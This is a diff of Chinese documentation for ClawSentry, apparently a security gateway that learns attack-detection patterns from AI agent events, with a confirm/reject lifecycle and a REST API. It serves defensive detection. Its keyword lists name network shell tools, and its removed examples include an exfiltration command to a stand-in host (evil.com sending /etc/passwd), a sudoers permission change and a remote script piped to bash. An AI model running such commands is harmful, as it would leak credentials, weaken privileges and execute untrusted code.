@@ -1,186 +1,325 @@
 ---
-title: 自进化模式库（Pattern Evolution）
-description: E-5 功能 — 从生产 Agent 事件中自动提取攻击模式，通过人工反馈实现 CANDIDATE→EXPERIMENTAL→STABLE 生命周期管理
+title: 模式演进
+description: 基于反馈的攻击模式自动提取与生命周期管理 — CANDIDATE → EXPERIMENTAL → STABLE → DEPRECATED
 ---
 
 <div class="cs-doc-hero" markdown>
-<div class="cs-eyebrow">Advanced · Adaptive Detection</div>
+<div class="cs-eyebrow">高级 · 自适应检测</div>
 
-## 自进化模式库
+## 自动从生产事件提取并演进攻击模式
 
-从生产 Agent 事件中自动提取候选攻击模式，通过运维人员人工反馈驱动 CANDIDATE → EXPERIMENTAL → STABLE 生命周期演进，构建随时间增长的动态防御体系。
+自动从高风险生产事件中提取候选攻击模式，并通过算子反馈驱动其经历四阶段生命周期，随时间推移不断扩充检测规则集。
 
 <div class="cs-pill-row" markdown>
-<span class="cs-pill">E-5 功能</span>
+<span class="cs-pill">实验性功能</span>
 <span class="cs-pill">默认关闭</span>
-<span class="cs-pill">CS_EVOLVING_ENABLED</span>
-<span class="cs-pill">EV- 前缀 ID</span>
+<span class="cs-pill">环境变量开关</span>
+<span class="cs-pill">四阶段生命周期</span>
 </div>
 </div>
-
-# 自进化模式库（Pattern Evolution）
 
 ## 概述 {#overview}
 
-传统安全规则库依赖人工预定义，面对新型攻击手法时存在固有局限：规则覆盖滞后、对变种攻击缺乏适应能力。ClawSentry 的自进化模式库（Pattern Evolution，E-5）从这一问题出发，在生产环境真实 Agent 行为中持续学习，将高风险事件自动转化为候选攻击模式，再通过运维人员的人工反馈驱动模式的生命周期演进。
+当 L1 或 L2 将某事件分类为高风险时，`PatternEvolutionManager.extract_candidate()` 会将触发命令清洗为可复用的正则表达式，并以 `CANDIDATE` 状态存储。算子通过 REST API 确认或拒绝候选模式，系统则根据反馈计数和五因子置信度分数自动晋升或废弃模式。
 
-具体来说，每当 L1 或 L2 引擎将一个事件判定为高风险时，`PatternEvolutionManager` 会自动提取其工具调用和命令，清洗具体参数（URL、IP、路径）后生成可重用的正则表达式，作为候选模式存入持久化存储。运维人员随后可以通过 REST API 逐一确认（confirm）或标记为误报（false positive），系统据此自动完成模式升级或废弃。
+!!! info "默认关闭"
+    模式演进由 `CS_EVOLVING_ENABLED`（默认 `false`）控制。在设置该标志前，不会发生任何候选提取或存储写入。若未配置 `CS_EVOLVED_PATTERNS_PATH`，启用该标志将在启动时抛出 `ValueError`。
 
-被提升至 EXPERIMENTAL 或 STABLE 状态的模式将参与 L2 `RuleBasedAnalyzer` 的实际检测，与内置的 25 条核心模式协同工作，构成一套随时间增长的动态防御体系。
+---
 
-!!! info "E-5 功能，默认关闭"
-    自进化模式库默认处于**禁用**状态（`CS_EVOLVING_ENABLED` 默认为 `false`）。
-    这是有意为之的设计：在充分评估生产环境的噪声水平之前，候选提取和 API
-    写操作不会发生，避免对现有检测逻辑产生意外干扰。
-    启用前请确保已配置 `CS_EVOLVED_PATTERNS_PATH`，否则提取的模式无法持久化。
+## `EvolvedPattern` 结构 {#schema}
+
+`EvolvedPattern` 是 `AttackPattern` 的子类，继承其所有触发/检测/FP 过滤字段。附加的生命周期字段如下：
+
+| 字段 | 类型 | 默认值 | 说明 |
+|---|---|---|---|
+| `status` | `PatternStatus` | `CANDIDATE` | 生命周期阶段（见下文） |
+| `confidence` | `float` | `0.0` | 计算所得 0.0–1.0 分值；晋升 STABLE 需达到 ≥ 0.70 |
+| `source_framework` | `str` | `""` | 触发事件所属框架（如 `a3s-code`、`openclaw`） |
+| `confirmed_count` | `int` | `0` | 算子确认次数 |
+| `false_positive_count` | `int` | `0` | 算子误报拒绝次数 |
+| `created_at` | `str` | UTC ISO-8601 | 提取时设置的时间戳 |
+| `last_triggered_at` | `str \| None` | `None` | 最近一次触发的 ISO-8601 时间戳；用于时效性评分 |
+
+`is_active` 属性仅在 `status` 为 `EXPERIMENTAL` 或 `STABLE` 时返回 `True`。`PatternMatcher` 将此作为将演进模式纳入实时检测的唯一判断条件。
 
 ---
 
 ## 模式生命周期 {#lifecycle}
 
-每个进化模式在其存在周期内处于以下四种状态之一。状态之间的迁移由用户反馈驱动，系统根据信心评分和反馈计数自动判断。
-
 ```mermaid
 stateDiagram-v2
-    [*] --> CANDIDATE : extract_candidate() 自动提取
+    [*] --> CANDIDATE : extract_candidate()
 
-    CANDIDATE --> EXPERIMENTAL : 第一次被用户确认 (confirmed=True)
-    CANDIDATE --> DEPRECATED : FP 保护触发\n(total≥3 且 fp_rate>30%)
+    CANDIDATE --> EXPERIMENTAL : 首次确认（confirmed=true）
+    EXPERIMENTAL --> STABLE : confirmed_count ≥ 3\n且 confidence ≥ 0.70
 
-    EXPERIMENTAL --> STABLE : confirmed_count≥3 且 confidence≥0.7
-    EXPERIMENTAL --> DEPRECATED : FP 保护触发\n(total≥3 且 fp_rate>30%)
-
-    STABLE --> DEPRECATED : FP 保护触发\n(total≥3 且 fp_rate>30%)
+    CANDIDATE --> DEPRECATED : FP rate > 30%\n且 total ≥ 3
+    EXPERIMENTAL --> DEPRECATED : FP rate > 30%\n且 total ≥ 3
+    STABLE --> DEPRECATED : FP rate > 30%\n且 total ≥ 3
 
     DEPRECATED --> [*]
+
+    note right of STABLE
+        STABLE/EXPERIMENTAL 不可回退至 CANDIDATE。
+        若需撤销，须手动删除模式并重新提取。
+    end note
 ```
 
-各状态含义如下：
+### 状态值
 
-| 状态 | 值 | 参与 L2 检测 | 说明 |
-|------|----|:----------:|------|
-| `CANDIDATE` | `"candidate"` | 否 | 初始状态，尚未经过人工验证，仅存储，不影响检测 |
-| `EXPERIMENTAL` | `"experimental"` | **是** | 经过至少一次人工确认，进入实验性检测阶段 |
-| `STABLE` | `"stable"` | **是** | 多次确认且信心评分达标，视为稳定可靠的检测规则 |
-| `DEPRECATED` | `"deprecated"` | 否 | 误报率过高或被主动废弃，不再参与检测 |
+| 状态 | 值 | 参与检测 | 含义 |
+|---|---|:---:|---|
+| `CANDIDATE` | `"candidate"` | 否 | 刚提取；等待算子首次审核 |
+| `EXPERIMENTAL` | `"experimental"` | **是** | 至少一次确认；在 L2 匹配中激活 |
+| `STABLE` | `"stable"` | **是** | ≥ 3 次确认且置信度 ≥ 0.70；视为可靠 |
+| `DEPRECATED` | `"deprecated"` | 否 | 误报率超出阈值或模式被丢弃 |
 
-`is_active` 属性是判断模式是否参与检测的唯一标准：
+### 转换规则（`promote_pattern()` 按优先级顺序评估）
 
-```python
-@property
-def is_active(self) -> bool:
-    """Only experimental and stable patterns participate in detection."""
-    return self.status in (PatternStatus.EXPERIMENTAL, PatternStatus.STABLE)
+所有转换均由对 `PatternEvolutionManager.confirm()` 的调用触发。
+
+```mermaid
+flowchart TD
+    A([调用 confirm\npattern_id, confirmed]) --> B{CS_EVOLVING_ENABLED?}
+    B -- 否 --> Z1([返回 &quot;disabled&quot;])
+    B -- 是 --> C{模式存在?}
+    C -- 否 --> Z2([返回 &quot;not_found&quot;])
+    C -- 是 --> D{confirmed = false?}
+    D -- 是 --> E[记录 FP\nfalse_positive_count++]
+    E --> F{total ≥ 3\n且 fp_rate > 30%?}
+    F -- 是 --> G([返回 &quot;deprecated_high_fp&quot;\n状态 → DEPRECATED])
+    F -- 否 --> H([返回 &quot;fp_recorded&quot;])
+    D -- 否 --> I[confirmed_count++]
+    I --> J{total ≥ 3\n且 fp_rate > 30%?}
+    J -- 是 --> G
+    J -- 否 --> K{当前状态?}
+    K -- CANDIDATE --> L([返回 &quot;promoted_to_experimental&quot;\n状态 → EXPERIMENTAL])
+    K -- EXPERIMENTAL --> M{confirmed_count ≥ 3\n且 confidence ≥ 0.70?}
+    M -- 是 --> N([返回 &quot;promoted_to_stable&quot;\n状态 → STABLE])
+    M -- 否 --> O([返回 &quot;confirmed&quot;\n保持 EXPERIMENTAL])
+    K -- STABLE --> P([返回 &quot;confirmed&quot;\n幂等，无状态变更])
 ```
 
----
+**规则 1 — FP 废弃（最高优先级）：**
 
-## 状态迁移规则 {#state-transitions}
+适用于任意状态。若 `total = confirmed_count + false_positive_count ≥ 3` 且 `false_positive_count / total > 0.30`，则模式立即设为 `DEPRECATED`，忽略其他条件。返回 `"deprecated_high_fp"`。
 
-状态迁移由 `promote_pattern()` 函数处理，每次调用 `confirm()` 时触发。迁移规则按以下**优先级顺序**执行：
+**规则 2 — CANDIDATE → EXPERIMENTAL：**
 
-### 规则 1：FP 保护降级（最高优先级）
+由对 `CANDIDATE` 模式的任意 confirmed=`True` 调用触发（FP 检查通过后）。返回 `"promoted_to_experimental"`。
 
-当任何状态的模式满足以下全部条件时，立即降级为 `DEPRECATED`，并返回 `"deprecated_high_fp"`：
+**规则 3 — EXPERIMENTAL → STABLE：**
 
-- `total = confirmed_count + false_positive_count >= 3`（需要足够的数据点，避免因单次误报就废弃）
-- `fp_rate = false_positive_count / total > 0.30`（误报率超过 30%）
+由对 `EXPERIMENTAL` 模式的 confirmed=`True` 调用触发，且同时满足以下两个条件：
 
-此规则在所有升级检查之前执行。即便模式刚刚满足升级条件，只要误报率超标，仍会被废弃。
+- `confirmed_count ≥ 3`
+- `compute_confidence(...) ≥ 0.70`
 
-### 规则 2：CANDIDATE → EXPERIMENTAL
+返回 `"promoted_to_stable"`。若计数满足但置信度不足，模式保持 `EXPERIMENTAL` 状态并返回 `"confirmed"`。
 
-条件：用户首次确认（`confirmed=True`），且 FP 保护未触发。
+**STABLE → STABLE：** 进一步确认返回 `"confirmed"`，不改变状态。
 
-返回值：`"promoted_to_experimental"`
-
-这是门槛最低的晋升：只需一次人工确认，模式即进入实验性检测阶段，开始对真实流量生效。
-
-### 规则 3：EXPERIMENTAL → STABLE
-
-条件：用户确认（`confirmed=True`），且 FP 保护未触发，且同时满足：
-
-- `confirmed_count >= 3`
-- `compute_confidence(...) >= 0.70`
-
-返回值：`"promoted_to_stable"`
-
-若 `confirmed_count` 达到 3 但信心评分不足 0.70，则保持 EXPERIMENTAL 状态，返回 `"confirmed"`。
-
-### 其他返回值
+### `confirm()` 的返回值
 
 | 返回值 | 触发条件 |
-|--------|---------|
-| `"disabled"` | `CS_EVOLVING_ENABLED` 未启用 |
-| `"not_found"` | 指定 `pattern_id` 不存在 |
-| `"confirmed"` | 确认成功，但未满足晋升条件 |
-| `"fp_recorded"` | 误报已记录，未触发降级（数据点不足或 fp_rate≤30%） |
+|---|---|
+| `"disabled"` | `CS_EVOLVING_ENABLED` 为 false |
+| `"not_found"` | `pattern_id` 不存在于存储中 |
+| `"deprecated_high_fp"` | FP 率超出阈值 |
+| `"promoted_to_experimental"` | CANDIDATE 的首次确认 |
+| `"promoted_to_stable"` | EXPERIMENTAL 满足计数 + 置信度阈值 |
+| `"confirmed"` | 已确认但未晋升（计数/置信度尚未满足，或已为 STABLE） |
+| `"fp_recorded"` | FP 已记录；total < 3 或 fp_rate ≤ 30%——不废弃 |
 
 ---
 
-## 信心评分 {#confidence-scoring}
+## 置信度评分 {#confidence}
 
-`compute_confidence()` 综合 5 个维度计算 0.0–1.0 范围内的信心分数，用于判断模式是否达到 STABLE 晋升门槛（≥ 0.70）。
-
-### 公式
-
-\[
-\text{confidence} = 0.30 \times R_c + 0.20 \times R_f + 0.20 \times R_x + 0.20 \times R_a + 0.10 \times R_t
-\]
-
-### 各因子详解
-
-| 因子 | 权重 | 变量名 | 计算方式 |
-|------|:----:|--------|---------|
-| 确认率 | 30% | \(R_c\) | `confirmed_count / max(total, 1)` |
-| 触发频率 | 20% | \(R_f\) | `min(trigger_count / 10.0, 1.0)`（触发 10 次为满分） |
-| 跨框架加成 | 20% | \(R_x\) | `min((framework_count - 1) / 2.0, 1.0)` |
-| 准确率 | 20% | \(R_a\) | `1.0 - fp_rate` |
-| 时效性 | 10% | \(R_t\) | 见下表 |
-
-跨框架加成 \(R_x\) 的取值说明：
-
-| 来源框架数 | \(R_x\) 值 |
-|:--------:|:-------:|
-| 1 个（如仅 a3s-code） | 0.0 |
-| 2 个（a3s-code + openclaw） | 0.5 |
-| 3 个及以上 | 1.0 |
-
-时效性 \(R_t\) 的衰减规则：
-
-| 距上次触发时间 | \(R_t\) 值 |
-|:------------:|:-------:|
-| ≤ 7 天 | 1.0 |
-| ≤ 30 天 | 0.5 |
-| > 30 天 | 0.2 |
-
-### 示例
-
-假设一个模式被确认 3 次、误报 0 次、触发 5 次、来源框架 1 个、距上次触发 3 天：
+`compute_confidence()` 返回 0.0–1.0 分值，用作 STABLE 晋升的阈值判断。计算公式：
 
 ```
-R_c = 3 / max(3+0, 1) = 1.0
-R_f = min(5 / 10.0, 1.0) = 0.5
-R_x = min((1-1) / 2.0, 1.0) = 0.0
-R_a = 1.0 - 0/3 = 1.0
-R_t = 1.0  (3天 ≤ 7天)
-
-confidence = 0.30×1.0 + 0.20×0.5 + 0.20×0.0 + 0.20×1.0 + 0.10×1.0
-           = 0.30 + 0.10 + 0.00 + 0.20 + 0.10
-           = 0.70  ← 恰好满足 STABLE 晋升门槛
+confidence = 0.30 × R_confirm + 0.20 × R_frequency + 0.20 × R_cross_fw + 0.20 × R_accuracy + 0.10 × R_recency
 ```
+
+| 因子 | 权重 | 变量 | 计算方法 |
+|---|:---:|---|---|
+| 确认比率 | 30% | `R_confirm` | `confirmed_count / max(total, 1)` |
+| 触发频率 | 20% | `R_frequency` | `min(trigger_count / 10.0, 1.0)` — 10 次触发后饱和 |
+| 跨框架加成 | 20% | `R_cross_fw` | `min((framework_count - 1) / 2.0, 1.0)` — 1 个来源为 0.0，2 个为 0.5，3+ 个为 1.0 |
+| 准确率 | 20% | `R_accuracy` | `1.0 - fp_rate` |
+| 时效性 | 10% | `R_recency` | 见下表 |
+
+基于 `days_since_last_trigger` 的时效衰减：
+
+| 距上次触发天数 | `R_recency` |
+|:---:|:---:|
+| ≤ 7 | 1.0 |
+| ≤ 30 | 0.5 |
+| > 30 | 0.2 |
+
+!!! note "`promote_pattern()` 如何调用 `compute_confidence()`"
+    在评估 EXPERIMENTAL → STABLE 时，`promote_pattern()` 传入 `framework_count=1` 和 `days_since_last=0`（假设为最近触发）。因此内部晋升检查不使用跨框架评分；该因子仅用于外部报告或自定义晋升逻辑。
 
 ---
 
-## 快速启用 {#quickstart}
+## 候选模式提取 {#extraction}
 
-### 步骤一：配置环境变量
+当演进功能启用时，`PatternEvolutionManager.extract_candidate()` 由 Gateway 在每次高风险事件时自动调用。
+
+### 去重
+
+工具名和命令以 `"{tool_name}:{command}"` 格式组合，经 SHA-256 哈希后取前 16 个十六进制字符作为去重键。相同命令始终映射到相同的模式 ID——`EV-{前 8 个十六进制字符，大写}`。重复调用返回已有 ID，不创建新模式。
+
+### 类别推断（`_infer_category()`）
+
+类别按优先级顺序解析：
+
+1. **ASI 原因代码**（最高优先级）：
+
+    | `reasons` 中的代码 | 类别 |
+    |---|---|
+    | `ASI01` | `goal_hijack` |
+    | `ASI02` | `data_exfiltration` |
+    | `ASI03` | `privilege_abuse` |
+    | `ASI04` | `supply_chain` |
+    | `ASI05` | `code_execution` |
+
+2. **命令关键字兜底**：
+
+    | 关键字 | 类别 |
+    |---|---|
+    | `curl`, `wget`, `nc `, `ncat` | `data_exfiltration` |
+    | `sudo`, `chmod`, `chown` | `privilege_abuse` |
+    | `eval`, `exec`, `python -c`, `bash -c` | `code_execution` |
+
+3. 无匹配时返回 `"unknown"`。
+
+### 正则清洗（`_sanitize_for_regex()`）
+
+命令中的具体值被替换为通用占位符，生成可复用的检测正则：
+
+| 原始 token 类型 | 替换内容 |
+|---|---|
+| HTTP/HTTPS URL | `https?://\S+` |
+| IPv4 地址 | `\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}` |
+| 文件路径（`/…`） | `[\w./-]+` |
+
+其余 shell 元字符均经 `re.escape()` 转义。清洗后的模式以权重 `6` 存储于 `detection.regex_patterns` 字段。
+
+---
+
+## 与基础模式的集成 {#integration}
+
+`pattern_matcher.py` 中的 `load_patterns()` 是核心模式与演进模式的合并点：
+
+- **核心模式** 始终从内置的 `attack_patterns.yaml`（≥ 25 条模式）加载。
+- **演进模式** 在提供 `evolved_path` 时追加，需通过两项过滤：
+    - `is_active` 必须为 `True`（状态为 EXPERIMENTAL 或 STABLE）。
+    - 模式 ID 不得与核心模式 ID 冲突。冲突将记录警告并跳过。
+
+`PatternMatcher.reload()` 在不重启进程的情况下重新从磁盘读取两个文件，使演进决策立即生效。
+
+!!! warning "ID 命名空间"
+    演进模式使用 `EV-` 前缀以避免与内置 `ASI*` ID 冲突。请勿在核心 YAML 中手动创建带有 `EV-` 前缀的模式。
+
+---
+
+## 存储持久化 {#persistence}
+
+`EvolvedPatternStore` 使用原子性的 `tempfile + os.replace` 序列将模式写入 YAML 文件，防止失败时数据损坏。文件格式：
+
+```yaml
+version: "1.0"
+evolved: true
+patterns:
+  - id: EV-A3F8B2C1
+    status: experimental
+    confidence: 0.72
+    confirmed_count: 2
+    false_positive_count: 0
+    ...
+```
+
+### 达到 `max_patterns` 上限时的驱逐策略
+
+当存储达到上限（`max_patterns`，默认 500）时，在添加新模式前会驱逐一条旧模式：
+
+1. 驱逐最旧的 `DEPRECATED` 模式（按 `created_at` 升序）。
+2. 若无，则驱逐最旧的 `CANDIDATE` 模式。
+3. 若所有模式均为 `EXPERIMENTAL` 或 `STABLE`，`add()` 返回 `False`，候选模式被丢弃。
+
+!!! warning "EXPERIMENTAL 和 STABLE 模式永不被驱逐"
+    只有 DEPRECATED 和 CANDIDATE 模式可被驱逐。模式一旦达到 EXPERIMENTAL 或 STABLE，无论存储压力多大都会被保留。
+
+---
+
+## 配置 {#config}
+
+| 环境变量 | 类型 | 默认值 | 说明 |
+|---|---|:---:|---|
+| `CS_EVOLVING_ENABLED` | bool | `false` | 设为 `1`、`true` 或 `yes`（大小写不敏感）以激活提取和 API 写入 |
+| `CS_EVOLVED_PATTERNS_PATH` | string | — | 演进 YAML 文件的绝对路径；`CS_EVOLVING_ENABLED=true` 时必填 |
+
+`PatternEvolutionManager` 构造函数参数：
+
+| 参数 | 类型 | 默认值 | 说明 |
+|---|---|:---:|---|
+| `store_path` | `str` | — | 对应 `CS_EVOLVED_PATTERNS_PATH` |
+| `enabled` | `bool` | `False` | 对应 `CS_EVOLVING_ENABLED` |
+| `max_patterns` | `int` | `500` | 存储模式数量的硬上限 |
+
+!!! danger "空 `store_path` 在启动时报错"
+    传入 `enabled=True` 且 `store_path` 为空或仅含空白字符时，立即抛出 `ValueError`。启用前请验证 `CS_EVOLVED_PATTERNS_PATH` 已正确设置。
+
+---
+
+## REST API {#api}
+
+所有端点均需 Bearer token（`CS_AUTH_TOKEN`）。
+
+### `GET /ahp/patterns`
+
+返回存储中的所有演进模式（所有状态）。`CS_EVOLVING_ENABLED` 为 false 时返回空 `patterns` 列表。
+
+**响应字段：** `enabled`、`store_path`、`count`、`active_count`、`candidate_count`、`patterns`（模式对象数组，含 `id`、`category`、`description`、`risk_level`、`status`、`confidence`、`source_framework`、`confirmed_count`、`false_positive_count`、`created_at`）。
+
+### `POST /ahp/patterns/confirm`
+
+通过算子反馈驱动状态转换。每次调用后自动持久化到磁盘。
+
+**请求体：**
+
+```json
+{ "pattern_id": "EV-A3F8B2C1", "confirmed": true }
+```
+
+| 字段 | 类型 | 必填 | 说明 |
+|---|---|:---:|---|
+| `pattern_id` | `string` | 是 | `EV-XXXXXXXX` 格式的模式 ID |
+| `confirmed` | `boolean` | 是 | `true` = 真实攻击；`false` = 误报。必须为 JSON 布尔值——字符串 `"true"` 返回 HTTP 400 |
+
+**HTTP 状态码：**
+
+| 代码 | 条件 |
+|:---:|---|
+| 200 | 成功；响应体包含 `{"result": "…", "pattern_id": "…"}` |
+| 400 | 请求字段缺失或无效 |
+| 403 | 演进功能已禁用 |
+| 404 | `pattern_id` 不存在于存储中 |
+
+**`result` 值：** `promoted_to_experimental`、`promoted_to_stable`、`confirmed`、`fp_recorded`、`deprecated_high_fp`。
+
+---
+
+## 快速入门 {#quickstart}
 
 === "环境变量"
 
     ```bash
     export CS_EVOLVING_ENABLED=true
     export CS_EVOLVED_PATTERNS_PATH=/var/lib/clawsentry/evolved_patterns.yaml
+    clawsentry-gateway
     ```
 
 === ".env 文件"
@@ -190,319 +329,20 @@ confidence = 0.30×1.0 + 0.20×0.5 + 0.20×0.0 + 0.20×1.0 + 0.10×1.0
     CS_EVOLVED_PATTERNS_PATH=/var/lib/clawsentry/evolved_patterns.yaml
     ```
 
-=== "agent.hcl"
-
-    ```hcl
-    env {
-      CS_EVOLVING_ENABLED          = "true"
-      CS_EVOLVED_PATTERNS_PATH     = "/var/lib/clawsentry/evolved_patterns.yaml"
-    }
-    ```
-
-!!! warning "持久化路径必须可写"
-    `CS_EVOLVED_PATTERNS_PATH` 所在目录必须对 Gateway 进程可写。首次写入时，
-    系统会自动创建目录（`os.makedirs(parent, exist_ok=True)`）。
-
-### 步骤二：启动 Gateway
-
-```bash
-clawsentry-gateway
-```
-
-Gateway 启动后，每当 L1 或 L2 将事件判定为高风险，`PatternEvolutionManager.extract_candidate()` 将自动被调用，提取候选模式并存入 YAML 文件。
-
-### 步骤三：查询候选模式
-
-```bash
-curl -s http://localhost:8080/ahp/patterns \
-  -H "Authorization: Bearer <CS_AUTH_TOKEN>" | jq .
-```
-
-### 步骤四：通过 API 确认或拒绝模式
-
-```bash
-# 确认：驱动模式向 EXPERIMENTAL/STABLE 晋升
-curl -s -X POST http://localhost:8080/ahp/patterns/confirm \
-  -H "Authorization: Bearer <CS_AUTH_TOKEN>" \
-  -H "Content-Type: application/json" \
-  -d '{"pattern_id": "EV-A3F8B2C1", "confirmed": true}'
-
-# 拒绝（标记为误报）
-curl -s -X POST http://localhost:8080/ahp/patterns/confirm \
-  -H "Authorization: Bearer <CS_AUTH_TOKEN>" \
-  -H "Content-Type: application/json" \
-  -d '{"pattern_id": "EV-A3F8B2C1", "confirmed": false}'
-```
-
----
-
-## API 使用 {#api}
-
-所有端点均需要 Bearer token 认证（`CS_AUTH_TOKEN` 环境变量）。
-
-### 查询进化模式列表 {#list-patterns}
-
-```
-GET /ahp/patterns
-```
-
-列出存储中所有进化模式（包括所有状态），未开启 `CS_EVOLVING_ENABLED` 时返回空列表。
-
-**请求示例：**
+Gateway 处理一定流量后，查询候选模式：
 
 ```bash
 curl http://localhost:8080/ahp/patterns \
-  -H "Authorization: Bearer your-token-here"
+  -H "Authorization: Bearer $CS_AUTH_TOKEN" | jq '.patterns[] | select(.status=="candidate")'
 ```
 
-**响应示例：**
+将候选模式确认为真实攻击：
 
-```json
-{
-  "patterns": [
-    {
-      "id": "EV-A3F8B2C1",
-      "category": "data_exfiltration",
-      "description": "Auto-extracted from event evt-001: curl http://evil.com -d @/etc/passwd",
-      "risk_level": "high",
-      "status": "experimental",
-      "confidence": 0.72,
-      "source_framework": "a3s-code",
-      "confirmed_count": 2,
-      "false_positive_count": 0,
-      "created_at": "2026-03-24T10:30:00+00:00"
-    },
-    {
-      "id": "EV-C7D2E4F0",
-      "category": "privilege_abuse",
-      "description": "Auto-extracted from event evt-042: sudo chmod 777 /etc/sudoers",
-      "risk_level": "critical",
-      "status": "candidate",
-      "confidence": 0.0,
-      "source_framework": "openclaw",
-      "confirmed_count": 0,
-      "false_positive_count": 0,
-      "created_at": "2026-03-24T14:15:00+00:00"
-    }
-  ]
-}
-```
-
-### 确认/拒绝模式 {#confirm-pattern}
-
-```
-POST /ahp/patterns/confirm
-```
-
-处理一次用户反馈，驱动模式状态迁移。每次调用后自动持久化（`store.save()`）。
-
-**请求体：**
-
-```json
-{
-  "pattern_id": "EV-A3F8B2C1",
-  "confirmed": true
-}
-```
-
-| 字段 | 类型 | 说明 |
-|------|------|------|
-| `pattern_id` | `string` | 模式 ID，格式为 `EV-XXXXXXXX` |
-| `confirmed` | `boolean` | `true` 表示确认为真实攻击，`false` 表示标记为误报 |
-
-**响应示例：**
-
-=== "晋升至 EXPERIMENTAL"
-
-    ```json
-    {
-      "result": "promoted_to_experimental",
-      "pattern_id": "EV-A3F8B2C1"
-    }
-    ```
-
-=== "晋升至 STABLE"
-
-    ```json
-    {
-      "result": "promoted_to_stable",
-      "pattern_id": "EV-A3F8B2C1"
-    }
-    ```
-
-=== "FP 保护触发，降级为 DEPRECATED"
-
-    ```json
-    {
-      "result": "deprecated_high_fp",
-      "pattern_id": "EV-A3F8B2C1"
-    }
-    ```
-
-=== "确认成功（未晋升）"
-
-    ```json
-    {
-      "result": "confirmed",
-      "pattern_id": "EV-A3F8B2C1"
-    }
-    ```
-
-=== "误报已记录（未降级）"
-
-    ```json
-    {
-      "result": "fp_recorded",
-      "pattern_id": "EV-A3F8B2C1"
-    }
-    ```
-
-=== "模式不存在"
-
-    ```json
-    {
-      "result": "not_found",
-      "pattern_id": "EV-NONEXIST"
-    }
-    ```
-
----
-
-## 双源加载机制 {#dual-source}
-
-L2 `RuleBasedAnalyzer` 使用 `load_patterns()` 函数同时加载两个来源的模式，合并后传入 `PatternMatcher`：
-
-```python
-def load_patterns(
-    path: Optional[str] = None,
-    *,
-    evolved_path: Optional[str] = None,
-) -> list[AttackPattern]:
-    ...
-```
-
-### 加载流程
-
-```mermaid
-flowchart TD
-    A[load_patterns 调用] --> B[加载内置核心模式\nattack_patterns.yaml\n25 条 v1.1]
-    A --> C{evolved_path\n是否配置?}
-    C -- 否 --> E[仅返回核心模式]
-    C -- 是 --> D[读取进化模式 YAML]
-    D --> F{解析每个模式\n检查 is_active}
-    F -- is_active=True\nEXPERIMENTAL/STABLE --> G[追加到模式列表]
-    F -- is_active=False\nCANDIDATE/DEPRECATED --> H[跳过，不参与检测]
-    B --> I[合并列表返回]
-    G --> I
-    E --> I
-```
-
-### 冲突处理
-
-若进化模式的 ID 与内置核心模式 ID 冲突（理论上不应发生，因为进化模式使用 `EV-` 前缀），则记录警告并跳过该进化模式：
-
-```python
-if ep.id in core_ids:
-    logger.warning("evolved pattern %s conflicts with core, skipping", ep.id)
-    continue
-```
-
-### 热重载
-
-`PatternMatcher.reload()` 可在不重启进程的情况下从磁盘重新加载全部模式（含进化模式），适用于在 API 确认后立即更新检测逻辑的场景。
-
----
-
-## 配置参考 {#config}
-
-| 环境变量 | 类型 | 默认值 | 说明 |
-|---------|------|:------:|------|
-| `CS_EVOLVING_ENABLED` | `bool` | `false` | 设为 `1`/`true`/`yes` 开启自进化功能（候选提取 + API 写操作） |
-| `CS_EVOLVED_PATTERNS_PATH` | `string` | —（未设置） | 进化模式 YAML 文件的持久化路径；未设置时功能无法持久化 |
-
-!!! note "布尔值解析"
-    `CS_EVOLVING_ENABLED` 接受 `1`、`true`、`yes`（大小写不敏感）视为真值，
-    其余任何值（含未设置）视为 `false`。
-
-`PatternEvolutionManager` 的完整初始化参数：
-
-| 参数 | 类型 | 默认值 | 说明 |
-|------|------|:------:|------|
-| `store_path` | `str` | — | YAML 存储路径，对应 `CS_EVOLVED_PATTERNS_PATH` |
-| `enabled` | `bool` | `False` | 对应 `CS_EVOLVING_ENABLED` |
-| `max_patterns` | `int` | `500` | 存储上限，超出时按驱逐顺序淘汰旧模式 |
-
-### 驱逐优先级
-
-当存储达到 `max_patterns` 上限时，系统按以下顺序驱逐旧模式（取最旧的一条）：
-
-1. 首先驱逐 `DEPRECATED` 状态的模式（按 `created_at` 升序）
-2. 其次驱逐 `CANDIDATE` 状态的模式（按 `created_at` 升序）
-3. 若全部模式均为 `EXPERIMENTAL` 或 `STABLE`（均不可驱逐），则 `add()` 返回 `False`，新候选被丢弃
-
----
-
-## 候选提取机制 {#extraction}
-
-`extract_candidate()` 在 Gateway 处理高风险事件时自动调用，其内部逻辑如下：
-
-### 命令去重
-
-对 `f"{tool_name}:{command}"` 计算 SHA-256，取前 16 位十六进制字符作为去重键。相同命令无论触发多少次，都只生成一个候选模式：
-
-```
-cmd_hash = sha256("bash:curl http://evil.com -d @/etc/passwd")[:16]
-pattern_id = f"EV-{cmd_hash[:8].upper()}"  # 例如 EV-A3F8B2C1
-```
-
-### 类别推断
-
-类别由 `_infer_category()` 按以下优先级推断：
-
-1. **reasons 中的 ASI 编号**（最高优先级）：
-
-    | ASI 编号 | 映射类别 |
-    |:--------:|---------|
-    | ASI01 | `goal_hijack` |
-    | ASI02 | `data_exfiltration` |
-    | ASI03 | `privilege_abuse` |
-    | ASI04 | `supply_chain` |
-    | ASI05 | `code_execution` |
-
-2. **命令关键词匹配**（次优先级）：
-
-    | 关键词 | 映射类别 |
-    |--------|---------|
-    | `curl`, `wget`, `nc `, `ncat` | `data_exfiltration` |
-    | `sudo`, `chmod`, `chown` | `privilege_abuse` |
-    | `eval`, `exec`, `python -c`, `bash -c` | `code_execution` |
-
-3. `"unknown"`（兜底）
-
-### 正则清洗
-
-`_sanitize_for_regex()` 将命令中的具体参数替换为通配符，生成可重用的检测正则：
-
-- HTTP/HTTPS URL → `https?://[^\s]+`
-- IPv4 地址 → `\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
-- 文件路径 → `[\w./-]+`
-
-例如 `curl http://10.0.0.1/shell.sh | bash` 会被清洗为 `curl https?://[^\s]+ [\w./-]+ | bash`，可以匹配同类变种攻击。
-
----
-
-## SSE 事件 {#sse-events}
-
-当模式状态发生变化时（由 `confirm()` 触发），Gateway 通过 SSE 广播 `pattern_evolved` 事件，订阅了 `/ahp/events` 的客户端（如 Web 仪表板）可实时感知状态变更。
-
-```json
-{
-  "event": "pattern_evolved",
-  "data": {
-    "pattern_id": "EV-A3F8B2C1",
-    "result": "promoted_to_experimental"
-  }
-}
+```bash
+curl -s -X POST http://localhost:8080/ahp/patterns/confirm \
+  -H "Authorization: Bearer $CS_AUTH_TOKEN" \
+  -H "Content-Type: application/json" \
